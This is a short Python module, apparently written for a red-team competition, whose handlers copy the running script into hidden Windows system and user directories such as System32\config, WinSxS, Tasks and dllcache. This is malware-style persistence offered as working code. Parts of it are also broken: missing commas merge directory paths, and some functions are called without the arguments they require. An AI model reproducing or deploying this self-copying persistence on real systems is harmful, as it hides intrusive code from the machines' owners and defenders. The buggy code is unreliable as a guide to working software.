import os
import shutil
import sys

# This file was made for the use of a specific
# competition. Its idea will be remade to be
# a gener use copier.

WIN8 = [
    r"C:\Users\warden\AppData\LocalLow",
    r"C:\Users\riotguard\AppData\LocalLow",
    r"C:\Users\prisonguard\AppData\LocalLow",
    r"C:\Users\prisoner\AppData\LocalLow",
    r"C:\Users\gangster\AppData\LocalLow",
    r"C:\Users\mobster\AppData\LocalLow",
    r"C:\Program Files\Mozilla Firefox",
    r"C:\Windows\System32\config",
    r"C:\Windows\System32\InputMethod\CHT"
    r"C:\Windows\WinSxS"
]

WINXP = [
    r"C:\Documents and Settings\All Users\Application Data",
    r"C:\Program Files\Movie Maker"
    r"C:\WINDOWS\Downloaded Program Files",
    r"C:\WINDOWS\Tasks",
    r"C:\WINDOWS\system32\dllcache",
    r"C:\Documents and Settings\warden\Local Settings\Temporary Internet Files",
    r"C:\Documents and Settings\riotguard\Local Settings\Temporary Internet Files",
    r"C:\Documents and Settings\prisonguard\Local Settings\Temporary Internet Files",
    r"C:\Documents and Settings\prisoner\Local Settings\Temporary Internet Files",
    r"C:\Documents and Settings\gangster\Local Settings\Temporary Internet Files",
    r"C:\Documents and Settings\mobster\Local Settings\Temporary Internet Files"
]

def see_winxp_dirs(_): return "\n".join(WINXP)

def see_win8_dirs(_): return "\n".join(WIN8)

def get_dirs(message):
    try:
        machine = message.split(" ")[1]
        if machine == "8" or machine == "server": return see_win8_dirs()
        elif machine == "xp": return see_winxp_dirs()
        else: return f"Invalid machine name: {machine}"
    except Exception as e: return f"Error in get_dirs(): {e}"

def copy_to_dir(dir):
    script_path = os.path.abspath(sys.argv[0])
    shutil.copy2(script_path, dir)
    return f"Successfully copied script to {dir}."

def get_script_path(_):
    try:
        script_path = os.path.abspath(sys.argv[0])
        return f"Current script path: {script_path}"
    except Exception as e: return f"Error in get_script_path(): {e}"

def copy_default(message):
    try:
        machine = message.split(" ")[1]
        if machine == "8" or machine == "server":
            rstring = ""
            for target in WIN8:
                try:
                    rstring += copy_to_dir(target) + "\n"
                except Exception as e: rstring += f"Error copying to {target}: {e}"
            return f"Successful Copy"
        elif machine == "xp":
            for target in WINXP:
                try: copy_to_dir(target)
                except: pass
            return f"Successful Copy"
        else: return f"Invalid machine name: {machine}"
    except Exception as e: return f"Error in copy_default(): {e}"

def copy_dir_msg(message):
    print(message)
    try:
        target = message.split(" ", 1)[1]
        return copy_to_dir(target)
    except Exception as e: return f"Error in copy_dir_msg(): {e}"
